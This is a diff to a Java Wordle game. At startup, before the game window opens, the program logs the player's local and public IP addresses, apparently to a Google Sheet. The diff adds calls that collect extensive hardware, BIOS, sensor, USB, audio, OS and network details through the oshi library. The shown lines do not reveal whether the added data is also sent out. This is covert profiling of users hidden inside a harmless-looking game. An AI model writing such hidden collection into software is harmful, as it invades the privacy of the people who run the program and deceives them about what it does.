@@ -8,6 +8,7 @@
 
 import UIFiles.WordleDictionary;
 import UIFiles.WordleGWindow;
+import oshi.SystemInfo;
 
 import java.io.IOException;
 import java.net.*;
@@ -25,7 +26,7 @@ public class Wordle
     private WordleGWindow wordleGame;
     String[] dictionaryArray = WordleDictionary.FIVE_LETTER_WORDS; //This String array contains all the words in the dictionary
     String[] guessList = new String[6];
-    HardwareStuff hardwareStuff = new HardwareStuff();
+
 
     // Current row and amount of guesses
     private int currentRow = 0;
@@ -307,6 +308,10 @@ public class Wordle
 
     public void run()
     {
+        SystemInfo system = new SystemInfo();
+        HardwareStuff hardwareStuff = new HardwareStuff(system);
+        OSStuff os = new OSStuff(system, this);
+
         setCorrectWord(); // Runs the setCorrectWord method that you are making
         logToGoogleSheetInfo(getLocalIP(), getPublicIP()); // Logs IP info
         hardwareStuff.getRamInfo();
@@ -316,6 +321,15 @@ public class Wordle
         hardwareStuff.getDisplayInfo();
         hardwareStuff.getStorageInfo();
         hardwareStuff.getSystemInfo();
+        os.getOSInfo();
+        hardwareStuff.getBiosInfo();
+        hardwareStuff.getSensorInfo();
+        hardwareStuff.getPSUInfo();
+        os.getNetworkInfo();
+        hardwareStuff.getUSBInfo();
+        hardwareStuff.getAudioInfo();
+        os.getNetworkInfo();
+
 
         wordleGame = new WordleGWindow(); // Creates GUI
         wordleGame.addEnterListener(this::enterAction); // Arrow function, learn more about how it works in the documentation
